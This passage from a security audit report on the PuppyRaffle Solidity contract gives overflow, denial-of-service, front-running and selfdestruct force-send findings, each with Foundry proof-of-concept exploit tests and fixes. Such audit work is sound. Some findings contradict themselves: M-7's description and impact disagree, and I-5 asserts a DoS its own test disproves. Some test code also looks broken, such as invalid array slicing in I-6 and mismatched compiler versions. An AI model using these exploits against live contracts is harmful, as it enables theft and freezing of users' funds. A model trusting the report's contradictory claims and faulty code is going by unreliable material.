        // Bruteforce entropy until zero slot is selected
        for (uint256 i; i < 1000; i++) {
            vm.warp(block.timestamp + 1);
            address caller = address(uint160(100 + i));
            vm.prank(caller);
            vm.expectRevert("ERC721: mint to the zero address");
            raffle.selectWinner();
        }
    }
}

## Suggested Mitigation
In `refund`, replace the player to be removed with the last element and `pop()` the array so that `players` never contains gaps. Alternatively, in `selectWinner` loop until a non-zero address is found or maintain a secondary data structure that tracks active players only.

## [M-6]. Integer Overflow issue in PuppyRaffle::enterRaffle

## Description
The contract is compiled with Solidity 0.7.6, which does not have built-in protection against integer overflows and underflows. Several arithmetic operations are performed without using a safe math library.
1. In `enterRaffle`, the calculation `entranceFee * newPlayers.length` can overflow if a large `entranceFee` is set and a large number of players join, allowing a payment check to be bypassed.
2. In `selectWinner`, `totalFees` is a `uint64` but `fee` is a `uint256`. The downcast `uint64(fee)` can truncate the value if `fee` exceeds `type(uint64).max`. The subsequent addition `totalFees + uint64(fee)` can also overflow `totalFees`.

## Impact
Overflows can lead to severe economic exploits. Bypassing the payment check in `enterRaffle` allows free entry into the raffle. Overflowing `totalFees` can lead to a loss of protocol revenue, as the contract will track a much smaller amount of fees than what was actually collected.

## Proof of Concept
1. Payment bypass with only two players
   • Owner deploys with entranceFee = 2**255 (valid uint256).
   • Attacker prepares a 2-element array. In Solidity 0.7, entranceFee * 2 wraps to 0, so `require(msg.value == 0)` passes.
   • Attacker sends msg.value = 0 and joins the raffle for free.

2. Fee-accounting loss
   • Deploy with entranceFee = type(uint64).max + 1 wei (> 2^64).
   • Exactly 4 players join (minimum needed to end raffle).
   • After selectWinner(), fee ≈ 0.8 * 4 * entranceFee  > 2^64 – 1, so the cast `uint64(fee)` truncates and `totalFees` stores an incorrect, much smaller value.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract IntegerOverflowFixedPoC is Test {
    function test_PaymentBypassWithTwoPlayers() public {
        uint256 hugeFee = 1 << 255; // 2**255
        PuppyRaffle raffle = new PuppyRaffle(hugeFee, address(0x1), 1 days);

        address[] memory players = new address[](2);
        players[0] = address(0xBEEF);
        players[1] = address(0xCAFE);

        // multiplication overflows to zero in 0.7.x
        assertEq(hugeFee * players.length, 0, "expected wrap to zero");

        raffle.enterRaffle{value: 0}(players); // succeeds with zero payment
        assertEq(raffle.getActivePlayerIndex(address(0xBEEF)), 1);
    }

    function test_TotalFeesTruncation() public {
        uint256 entranceFee = uint256(type(uint64).max) + 1; // just over 2^64
        vm.deal(address(this), entranceFee * 4);

        PuppyRaffle raffle = new PuppyRaffle(entranceFee, address(0x1), 1 days);

        address[] memory players = new address[](4);
        players[0] = address(0xA);
        players[1] = address(0xB);
        players[2] = address(0xC);
        players[3] = address(0xD);

        raffle.enterRaffle{value: entranceFee * 4}(players);
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();

        // totalFees must be strictly smaller than the real fee because of uint64 truncation
        assertLt(uint256(raffle.totalFees()), (entranceFee * 4) / 5, "fee truncated");
    }
}

## Suggested Mitigation
The primary mitigation is to upgrade the compiler to `pragma solidity ^0.8.0;`, which provides automatic checked arithmetic, reverting on overflow or underflow. If remaining on version 0.7.x, import and use OpenZeppelin's `SafeMath` library for all arithmetic operations.
Additionally, change the type of `totalFees` from `uint64` to `uint256` to prevent truncation and significantly reduce the risk of overflow.

```solidity
// In PuppyRaffle.sol
// pragma solidity ^0.8.0;

// Change state variable
uint256 public totalFees;

// No SafeMath needed with ^0.8.0, as checks are built-in.
// The calculation `totalFees = totalFees + uint64(fee)` would simply become:
// `totalFees = totalFees + fee;`
```

## [M-7]. DOS issue in PuppyRaffle::selectWinner

## Description
The `refund` function sets a refunded player's address to `address(0)` in the `players` array, creating a gap. The `selectWinner` function does not account for this possibility. If the randomly generated `winnerIndex` points to one of these `address(0)` slots, the prize transfer is attempted to the zero address. The low-level `.call` to `address(0)` succeeds and returns `true`, but no Ether is transferred, causing the entire prize pool to be permanently locked in the contract. Subsequently, the NFT is minted to `address(0)`, which is equivalent to burning it.

## Impact
If the randomly selected winner slot contains address(0) the call to _safeMint reverts with "ERC721: mint to the zero address". The whole selectWinner transaction reverts, leaving the raffle unresolved. Because anyone can refund and create unlimited address(0) gaps at zero net cost, an attacker can make it highly probable (or certain) that every execution of selectWinner reverts, permanently blocking the completion of the raffle and withdrawal of fees (because withdrawFees also requires no active players). This is a denial-of-service against the core protocol functionality and traps all collected ETH inside the contract until a non-zero winner can be picked, which may be practically impossible when the array is dominated by zero slots.

## Proof of Concept
1. Attackers enter the raffle with enough addresses to satisfy the minimum-player requirement.
2. All attacker addresses immediately call refund(), turning every slot into address(0) but recovering their entrance fees.
3. Raffle duration elapses.
4. Any user tries to call selectWinner(). With probability 100 % (all zero slots) winner == address(0) and the function reverts inside _safeMint.
5. Every subsequent attempt to call selectWinner() keeps reverting, blocking the raffle forever.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GapWinnerRevertsTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    address constant FEE_ADDR = address(0xdead);
    uint256 constant DUR = 1 hours;

    address[4] participants = [address(1), address(2), address(3), address(4)];

    function setUp() public {
        raffle = new PuppyRaffle(FEE, FEE_ADDR, DUR);
        vm.deal(address(this), FEE * 4);
        address[] memory addrs = new address[](4);
        for (uint i; i < 4; i++) {
            addrs[i] = participants[i];
        }
        raffle.enterRaffle{value: FEE * 4}(addrs);

        // Make every slot zero by refunding all
        for (uint i; i < 4; i++) {
            uint idx = raffle.getActivePlayerIndex(participants[i]);
            vm.prank(participants[i]);
            raffle.refund(idx);
        }

        // Fast-forward raffle
        vm.warp(block.timestamp + DUR + 1);
    }

    function test_selectWinnerRevertsBecauseWinnerIsZero() public {
        vm.expectRevert("ERC721: mint to the zero address");
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Either (1) make the players array dense by replacing the refunded element with the last element and popping the array, or (2) in selectWinner loop/re-roll until a non-zero address is found and reduce players.length when a refund occurs. Option 1 is gas-efficient and fully removes the DoS vector.

## [M-8]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::changeFeeAddress

## Description
The `changeFeeAddress` function immediately updates the `feeAddress`. If an owner broadcasts a transaction to change this address (e.g., because the old one is compromised), an attacker monitoring the mempool can front-run this transaction. The attacker can submit their own transaction calling `withdrawFees` with a higher gas price. This will cause the withdrawal to execute before the address change, sending all accumulated fees to the old (and potentially compromised) address.

## Impact
Protocol fees can be stolen by a front-runner. This is especially critical if the owner is trying to change the address precisely because the old one has been compromised, as the attack guarantees the funds are lost.

## Proof of Concept
1. The `feeAddress` private key is compromised. The owner wants to change it to `newFeeAddress`.
2. The contract holds 10 ETH in `totalFees`.
3. The owner submits a transaction to call `changeFeeAddress(newFeeAddress)`.
4. The attacker (who controls the compromised key or is just an opportunistic MEV bot) sees this in the mempool.
5. The attacker broadcasts a `withdrawFees()` transaction with a higher gas fee, ensuring it's mined first.
6. The `withdrawFees()` call succeeds, sending 10 ETH to the old, compromised `feeAddress`.
7. The owner's `changeFeeAddress()` transaction is then mined, but the fees are already gone.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleFrontrunTest is Test {
    PuppyRaffle puppyRaffle;
    address owner;
    address oldFeeAddress;
    address newFeeAddress = makeAddr("newFeeAddress");
    uint256 entranceFee = 1 ether;

    function setUp() public {
        owner = msg.sender;
        oldFeeAddress = makeAddr("oldFeeAddress");
        puppyRaffle = new PuppyRaffle(entranceFee, oldFeeAddress, 1 days);

        // Run a raffle to accumulate some fees
        address[] memory players = new address[](4);
        for (uint i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 1));
        }
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        vm.warp(block.timestamp + 2 days);
        puppyRaffle.selectWinner();
    }

    function test_FrontrunChangeFeeAddress() public {
        uint256 fees = puppyRaffle.totalFees();
        assertTrue(fees > 0, "Fees should have accumulated");

        // In a real scenario, the attacker sees the owner's `changeFeeAddress` tx in the mempool.
        // The attacker front-runs it by calling `withdrawFees` with higher gas.
        // We simulate this by calling `withdrawFees` before `changeFeeAddress`.

        uint256 oldAddressBalanceBefore = oldFeeAddress.balance;
        // Attacker's front-run transaction
        puppyRaffle.withdrawFees();
        uint256 oldAddressBalanceAfter = oldFeeAddress.balance;

        // Check that fees went to the old address
        assertEq(oldAddressBalanceAfter, oldAddressBalanceBefore + fees, "Fees sent to old address");

        // Now, the owner's original transaction is mined
        vm.prank(owner);
        puppyRaffle.changeFeeAddress(newFeeAddress);

        // The fee address is changed, but it's too late.
        assertEq(puppyRaffle.feeAddress(), newFeeAddress, "Fee address should be updated");
        assertEq(puppyRaffle.totalFees(), 0, "Fees should have been withdrawn");
    }
}
```

## Suggested Mitigation
Restrict `withdrawFees` so that only the contract owner or the current `feeAddress` can call it. This prevents arbitrary third-parties from front-running a pending `changeFeeAddress` transaction.

Example fix:

function withdrawFees() external {
    require(msg.sender == owner() || msg.sender == feeAddress, "Not authorized");
    require(address(this).balance == uint256(totalFees), "There are currently players active!");

    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

The owner can now safely call `changeFeeAddress` and then `withdrawFees` (either in two consecutive transactions or atomically via a multisend), eliminating the MEV attack surface.



# Low Risk Findings

## [L-1]. Integer Overflow issue in PuppyRaffle::enterRaffle

## Description
The contract is built with Solidity `0.7.6`, which does not provide default protection against integer overflow and underflow. Mathematical operations, particularly multiplication, can wrap around if the result exceeds the maximum value for a `uint256`. The calculation `entranceFee * newPlayers.length` in `enterRaffle` and `players.length * entranceFee` in `selectWinner` are vulnerable. An attacker could craft an `entranceFee` and a number of players such that the product overflows to a small number (or zero), allowing them to enter the raffle for free or disrupting the prize calculation.

## Impact
Integer overflow can let players enter the raffle with less ether than intended and corrupt prize accounting, but only if the contract is deployed with an entranceFee large enough that even small-sized multiplications wrap, or if the number of players is so huge that it causes overflow – both of which are impractical under normal usage. Therefore the risk is mostly confined to mis-configuration at deployment time.

## Proof of Concept
1. A malicious contract owner (or a user interacting with a vulnerable version of the contract) sets an extremely large `entranceFee`, such as `type(uint256).max / 2 + 1`.
2. An attacker then calls `enterRaffle` with an array of 2 new players.
3. The contract calculates the required payment as `entranceFee * 2`. Due to the overflow, this calculation results in `0`.
4. The check `msg.value == 0` passes even though the attacker sent `0` ETH.
5. The attacker successfully enters two players into the raffle without paying.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    address public feeAddress = makeAddr("feeAddress");
    uint256 public raffleDuration = 1 days;

    function test_integerOverflow_enterRaffleForFree() public {
        // 1. Set a malicious entranceFee that will overflow when multiplied by 2.
        uint256 maliciousFee = type(uint256).max / 2 + 1;
        PuppyRaffle newRaffle = new PuppyRaffle(maliciousFee, feeAddress, raffleDuration);

        address[] memory players = new address[](2);
        players[0] = makeAddr("player1");
        players[1] = makeAddr("player2");

        // 2. The required value should be `maliciousFee * 2`, which overflows to 0.
        // The attacker can therefore enter two players by sending 0 ETH.
        uint256 requiredValue = maliciousFee * 2;
        assertEq(requiredValue, 0, "Value should overflow to 0");

        // 3. Attacker calls enterRaffle with 0 value and successfully enters.
        newRaffle.enterRaffle{value: 0}(players);

        // 4. Assert that the players were added.
        assertEq(newRaffle.players(0), players[0]);
        assertEq(newRaffle.players(1), players[1]);
    }
}
```

## Suggested Mitigation
The best practice is to upgrade the Solidity compiler to version `0.8.0` or higher, which has built-in overflow and underflow checks that will cause a transaction to revert on overflow. If staying on `0.7.x` is required, use a SafeMath library for all arithmetic operations.

```solidity
// Mitigation using SafeMath with 0.7.6
import "@openzeppelin/contracts/math/SafeMath.sol";

contract PuppyRaffle {
    using SafeMath for uint256;

    function enterRaffle(address[] memory newPlayers) public payable {
        uint256 requiredAmount = entranceFee.mul(newPlayers.length);
        require(msg.value == requiredAmount, "PuppyRaffle: Must send enough to enter raffle");
        // ...
    }

    function selectWinner() external {
        // ...
        uint256 totalAmountCollected = uint256(players.length).mul(entranceFee);
        // ...
    }
}
```

## [L-2]. Pausable Emergency Stop issue in PuppyRaffle::NA

## Description
The contract lacks a critical safety feature: an emergency stop or pause mechanism. If a severe vulnerability is discovered in the live contract (such as the ones identified in this audit), the owner has no way to temporarily halt its operations. Malicious actors could continue to exploit the vulnerability, putting user funds and the protocol's reputation at risk.

## Impact
In the event of a critical bug, the inability to pause the contract means that exploits can continue unchecked. This could lead to a complete drain of funds from the contract or other irreversible damage. The owner's only recourse would be to socially persuade users not to interact with the contract, which is often ineffective.

## Proof of Concept
1. A critical vulnerability, like the weak randomness, is discovered and made public.
2. Malicious actors start exploiting it to guarantee they win the raffle.
3. The contract owner becomes aware of the exploit.
4. Without a pause function, the owner can do nothing to stop new players from entering the flawed raffle or to prevent the attackers from calling `selectWinner` to claim prizes.
5. Funds continue to be lost until a fixed contract can be deployed and the community migrates, assuming that is even possible.

## Proof of Code
NA

## Suggested Mitigation
Implement a pausable mechanism by inheriting from OpenZeppelin's `Pausable` contract. Then, apply the `whenNotPaused` modifier to all critical functions that perform state changes or handle funds, such as `enterRaffle`, `refund`, `selectWinner`, and `withdrawFees`.

```solidity
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Pausable.sol";

contract PuppyRaffle is Ownable, Pausable, ... {

    // Add pause and unpause functions callable only by the owner
    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }

    function enterRaffle(address[] memory newPlayers) public payable whenNotPaused {
        // ...
    }

    function refund(uint256 playerIndex) public whenNotPaused {
        // ...
    }

    function selectWinner() external whenNotPaused {
        // ...
    }

    function withdrawFees() external whenNotPaused {
        // ...
    }
}
```

## [L-3]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses `pragma solidity 0.7.6;`, which is an outdated version of the Solidity compiler. Versions older than 0.8.0 do not have default overflow and underflow checks, making them inherently riskier. This forces developers to rely on external libraries like `SafeMath`, which was not done in this contract, leading to a critical integer overflow vulnerability. Furthermore, older compilers may have known but unpatched bugs.

## Impact
Because arithmetic operations are unchecked, an attacker can deliberately create an overflow in the `require(msg.value == entranceFee * newPlayers.length)` check. If the contract is deployed with a very large `entranceFee`, the attacker can choose a `newPlayers` array length that causes the multiplication to wrap to a small number (including zero) and enter the raffle while paying far less than intended. Although this requires an unrealistic entranceFee choice by the deployer, it shows that fee accounting is not trust-sound and justifies a Low-severity issue.

## Proof of Concept
Suppose the owner deploys the contract with
  entranceFee = 2**255 (≈5.79e76 wei).
A user supplies an array with exactly two player addresses.
With Solidity 0.7.6 the multiplication overflows:
  entranceFee * 2 = 2**256 = 0 (mod 2**256)
Therefore the `require` becomes `msg.value == 0` and passes when the caller sends no ether, letting the attacker register two addresses for free even though each ticket is priced at 2**255 wei.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract OverflowEnterRaffleTest is Test {
    function test_FreeEntryViaOverflow() public {
        // Deploy with an intentionally huge fee that makes 2*fee overflow.
        uint256 hugeFee = 1 << 255;
        PuppyRaffle raffle = new PuppyRaffle(hugeFee, address(this), 1 days);

        address[] memory players = new address[](2);
        players[0] = address(0x1);
        players[1] = address(0x2);

        // Because hugeFee * 2 wraps to 0, we can call with no value.
        raffle.enterRaffle{value: 0}(players);

        // First player should now be active (index 0).
        assertEq(raffle.getActivePlayerIndex(address(0x1)), 0);
    }
}

## Suggested Mitigation
Compile the contract with pragma `^0.8.20` (or the latest stable 0.8.x release). Solidity ≥0.8.0 introduces automatic overflow/underflow checks, which will cause the multiplication in `enterRaffle` and any other arithmetic operation to revert instead of wrapping.

## [L-4]. DOS issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function uses a strict equality check, `require(address(this).balance == uint256(totalFees), ...)`. This check is fragile and creates a Denial of Service vector. If the contract's balance ever becomes different from `totalFees` for any reason (e.g., someone accidentally sending ETH to the contract, or a rounding difference), the check will perpetually fail, making it impossible to withdraw any fees.

## Impact
An attacker can permanently block the protocol from withdrawing its 20 % fee share by forcibly sending a tiny amount of Ether (e.g. through self-destruct) to the contract. User prize pools remain safe, but protocol revenue is locked forever.

## Proof of Concept
1. Run a raffle so that `totalFees > 0` and `address(this).balance == totalFees`.
2. Deploy a helper contract that self-destructs to the PuppyRaffle address, forcing 1 wei into it.
3. Because `address(this).balance != totalFees`, every future `withdrawFees()` call reverts with "PuppyRaffle: There are currently players active!".

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ForceSend { constructor() payable {} function boom(address payable target) external { selfdestruct(target); } }

contract PuppyRaffleTest is Test {
    PuppyRaffle raffle;
    address feeAddress;

    function setUp() public {
        feeAddress = makeAddr("feeAddress");
        raffle = new PuppyRaffle(1 ether, feeAddress, 1 days);
        address[] memory p = new address[](4);
        for (uint i; i < 4; ++i) p[i] = makeAddr(vm.toString(i));
        raffle.enterRaffle{value: 4 ether}(p);
        vm.warp(block.timestamp + 2 days);
        raffle.selectWinner(); // balance == totalFees (0.8 ether)
    }

    function testFeeWithdrawDOS() public {
        // force 1 wei into contract
        new ForceSend{value: 1 wei}().boom(payable(address(raffle)));
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Replace the fragile equality with logic that tolerates extra Ether and explicitly verifies no players are active:

function withdrawFees() external {
    require(players.length == 0, "Players still active");
    uint256 feesToWithdraw = totalFees;
    require(feesToWithdraw > 0, "No fees");
    totalFees = 0;
    (bool ok, ) = feeAddress.call{value: feesToWithdraw}("");
    require(ok, "Transfer failed");
}



# Info Risk Findings

## [I-1]. Event Consistency issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function executes several critical state changes, including selecting a winner, transferring the prize pool, minting an NFT, and resetting the raffle. However, it fails to emit an event to log this significant action. The lack of an event makes it difficult for off-chain services, dApps, and users to efficiently track and verify raffle outcomes.

## Impact
Without an event, monitoring the contract's primary activity becomes difficult and inefficient. Front-ends and other services would need to resort to expensive transaction tracing to determine who won each raffle, what prize was paid, and which NFT was minted. This increases infrastructure complexity and reduces transparency.

## Proof of Concept
1. A raffle concludes and `selectWinner` is successfully called.
2. A user wins the prize pool and receives an NFT.
3. A third-party service (e.g., a data analytics platform or a user-facing dashboard) wants to display a history of all raffle winners.
4. Since no `WinnerSelected` event was emitted, the service cannot simply query for events. It must instead fetch every transaction sent to the contract, trace its execution, and inspect state changes to reconstruct the raffle's history, which is a far more complex and less reliable process.

## Proof of Code
NA

## Suggested Mitigation
Define and emit an event within the `selectWinner` function that includes key information about the outcome. This event should be indexed to allow for efficient searching.

```solidity
contract PuppyRaffle is ERC721, Ownable {
    // ... other state variables and events

    event WinnerSelected(address indexed winner, uint256 prizeAmount, uint256 indexed tokenId);

    function selectWinner() external {
        // ... logic to determine winner, prizePool, tokenId ...

        _safeMint(winner, tokenId);

        emit WinnerSelected(winner, prizePool, tokenId);
    }
}
```

## [I-2]. Event Consistency issue in PuppyRaffle::selectWinner, withdrawFees

## Description
The `selectWinner` and `withdrawFees` functions perform critical operations involving significant value transfer and state changes, but they do not emit events. The `selectWinner` function determines a winner, distributes the prize pool, and mints an NFT. `withdrawFees` transfers all accumulated fees to the owner. The absence of events for these actions makes it difficult for off-chain monitoring tools, block explorers, and users to track the contract's activities, reducing transparency and auditability.

## Impact
The absence of purpose-built events only harms transparency and off-chain indexing. It does not enable loss of funds or otherwise compromise the protocol’s security. Users and integrators may find it harder to track raffle history and fee withdrawals, but contract functionality and asset safety remain unaffected.

## Proof of Concept
1. Call the `selectWinner()` function.
2. Inspect the transaction receipt logs.
3. Observe that while a generic `ERC721(Transfer)` event is emitted, there is no specific event like `WinnerSelected` that logs the winner's address, the prize amount, and the NFT token ID in a single, easily parsable event.
4. Similarly, calling `withdrawFees` results in a value transfer with no corresponding event.

## Proof of Code
N/A

## Suggested Mitigation
Define and emit events for all critical state changes and financial operations. This enhances transparency and makes the contract easier to integrate with off-chain services.

```solidity
// Add event declarations
event WinnerSelected(address indexed winner, uint256 prizeAmount, uint256 indexed tokenId);
event FeesWithdrawn(address indexed feeAddress, uint256 amount);

// In selectWinner() function
// ... after prize has been sent and NFT minted
emit WinnerSelected(winner, prizePool, tokenId);

// In withdrawFees() function
// ... before sending the fees
emit FeesWithdrawn(feeAddress, feesToWithdraw);
(bool success, ) = feeAddress.call{value: feesToWithdraw}("");
```

## [I-3]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses a floating pragma version (`pragma solidity ^0.7.6;`). This allows the contract to be compiled with any compiler version from 0.7.6 up to, but not including, 0.8.0. Deploying a contract with a different compiler version than the one it was developed and tested with can introduce unexpected bugs or behaviors, as different compiler versions may have different bugs or generate slightly different bytecode.

## Impact
Using a floating pragma can lead to issues with reproducibility and security. If a new, buggy compiler version is released within the `^0.7.6` range, the contract might be deployed with it inadvertently, potentially exposing it to newly discovered vulnerabilities.

## Proof of Concept
1. The contract is written and tested with Solidity compiler version 0.7.6.
2. A new compiler version, 0.7.7, is released which contains a new optimizer bug.
3. A user or deployment script compiles the contract using the latest available compiler, which is now 0.7.7.
4. The resulting bytecode deployed on-chain differs from the tested version and may contain the optimizer bug, leading to unpredictable behavior.

## Proof of Code
N/A

## Suggested Mitigation
It is best practice to lock the pragma to the specific compiler version that the contract was tested with. This ensures that the deployed bytecode is identical to the one that was audited and tested.

```solidity
- pragma solidity ^0.7.6;
+ pragma solidity 0.7.6;
```

## [I-4]. Event Consistency issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function, which allows for the withdrawal of accumulated fees, does not emit an event upon successful execution. This makes it difficult to track fee withdrawals and maintain a clear, on-chain audit trail of the protocol's earnings.

## Impact
Similar to the missing event in `selectWinner`, this lack of logging hinders transparency and makes it harder for stakeholders and community members to monitor the flow of funds from the contract.

## Proof of Concept
1. The contract owner calls `withdrawFees`.
2. The accumulated fees are transferred to the `feeAddress`.
3. There is no event emitted, so anyone wishing to track total fees paid out by the protocol must inspect the transaction history of the `feeAddress` and try to identify incoming transfers from the raffle contract, which is inefficient and may be inaccurate if the fee address is used for other purposes.

## Proof of Code
NA

## Suggested Mitigation
Add an event to the `withdrawFees` function to log the amount withdrawn and the recipient address.

```diff
+   event FeesWithdrawn(address indexed feeAddress, uint256 amount);

    function withdrawFees() external {
        // ...
        (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
+       emit FeesWithdrawn(feeAddress, feesToWithdraw);
    }
```

## [I-5]. DOS issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function calls `delete players` to clear the list of participants. The gas cost of deleting a dynamic array is proportional to its length. If a large number of players join the raffle, the gas required to execute `delete players` can exceed the block gas limit. This would cause any call to `selectWinner` to fail, effectively freezing the contract and trapping all the funds inside permanently.

## Impact
No denial-of-service condition exists. `selectWinner` remains callable regardless of how many entries the `players` array previously contained, because `delete players` merely zeros the length slot.

## Proof of Concept
The following demonstrates that even after inserting thousands of players, `selectWinner` executes without running out of gas because `delete players` consumes constant gas.
1. Deploy contract.
2. Add 3,000 players (20 batches of 150 addresses) paying the appropriate entrance fee.
3. Fast-forward time to end the raffle.
4. Call `selectWinner` – the transaction succeeds and the winner is selected.

This disproves the claimed DoS.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract PuppyRaffleNoDoSTest is Test {
    PuppyRaffle raffle;
    address feeAddress = makeAddr("feeAddress");

    function setUp() public {
        raffle = new PuppyRaffle(0.001 ether, feeAddress, 1 days);
    }

    function testSelectWinnerWorksWithLargeArray() public {
        uint256 entranceFee = 0.001 ether;
        uint256 playersPerTx = 150;
        uint256 numBatches = 20; // 3,000 players total

        address[] memory players = new address[](playersPerTx);
        for (uint256 i = 0; i < numBatches; i++) {
            for (uint256 j = 0; j < playersPerTx; j++) {
                players[j] = address(uint160(uint256(keccak256(abi.encode(i, j)))));
            }
            raffle.enterRaffle{value: entranceFee * playersPerTx}(players);
        }

        vm.warp(block.timestamp + 2 days);

        // Should NOT revert
        raffle.selectWinner();

        // Basic sanity check: previousWinner should now be non-zero
        assertTrue(raffle.previousWinner() != address(0));
    }
}

## Suggested Mitigation
No change required; current implementation is safe from the alleged gas-exhaustion issue.

## [I-6]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
In `selectWinner`, prize and fee calculations involve multiplying `totalAmountCollected` by 80 and 20 respectively. The contract is on Solidity 0.7.6, which lacks default overflow protection. If `totalAmountCollected` is sufficiently large (e.g., greater than `type(uint256).max / 80`), the intermediate multiplication will overflow, wrap around to a small number, and result in an erroneously small `prizePool` and `fee`.

## Impact
Because all arithmetic is performed on amounts denominated in wei, an overflow could only occur if the contract’s ETH balance exceeded ~1.5e76 wei (>1e58 ETH). This is several orders of magnitude larger than the entire supply of ETH, so the overflow cannot be triggered in practice. Therefore, no real funds are at risk on main-net; the issue is theoretical and limited to fuzz/unit-test environments.

## Proof of Concept
1. Set a high `entranceFee` during deployment.
2. Have enough players enter such that `players.length * entranceFee` is a very large number, specifically greater than `type(uint256).max / 80` (approx `3.6e75`).
3. Call `selectWinner`.
4. The calculation `totalAmountCollected * 80` overflows.
5. `prizePool` is calculated based on the small, wrapped-around value.
6. The winner is sent a tiny amount of ETH, and the remaining funds are locked in the contract forever.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract IntegerOverflowTest is Test {
    PuppyRaffle puppyRaffle;
    
    function testPrizeCalculationOverflow() public {
        uint256 hugeEntranceFee = (type(uint256).max / 80) + 1;
        puppyRaffle = new PuppyRaffle(hugeEntranceFee, makeAddr("fee"), 60);

        address[] memory players = new address[](2);
        players[0] = makeAddr("p1");
        players[1] = makeAddr("p2");

        vm.prank(players[0]);
        puppyRaffle.enterRaffle{value: hugeEntranceFee}(players[0:1]);
        vm.prank(players[1]);
        puppyRaffle.enterRaffle{value: hugeEntranceFee}(players[1:1]);
        
        uint256 totalAmountCollected = 2 * hugeEntranceFee;
        console.log("Total collected (should be huge): %s", totalAmountCollected);

        // This will overflow, but Solidity 0.7.6 won't revert
        uint256 expectedPrizePool = (totalAmountCollected * 80) / 100;
        console.log("Prize pool with overflow: %s", expectedPrizePool); // Will be a small number

        vm.warp(block.timestamp + 61);

        address p1 = players[0];
        uint256 balanceBefore = p1.balance;

        // The winner will receive a negligible amount, not the expected prize
        vm.prank(makeAddr("caller"));
        puppyRaffle.selectWinner();

        uint256 balanceAfter = puppyRaffle.previousWinner().balance;
        uint256 prizeReceived = balanceAfter - balanceBefore;
        
        // The prize received will be the tiny overflowed amount, not the correct prize.
        assertLt(prizeReceived, hugeEntranceFee);
    }
}
```

## Suggested Mitigation
Use a safe math library to prevent overflows, or upgrade the contract to Solidity `^0.8.0` where arithmetic operations are checked by default. The recommended approach for older versions is OpenZeppelin's `SafeMath` library.

```solidity
// Add library import
import "@openzeppelin/contracts/math/SafeMath.sol";

contract PuppyRaffle {
    // Add using directive
    using SafeMath for uint256;

    function selectWinner() external {
        // ...
        uint256 totalAmountCollected = uint256(players.length).mul(entranceFee);
        uint256 prizePool = totalAmountCollected.mul(80).div(100);
        uint256 fee = totalAmountCollected.mul(20).div(100);
        // ...
    }
}
```



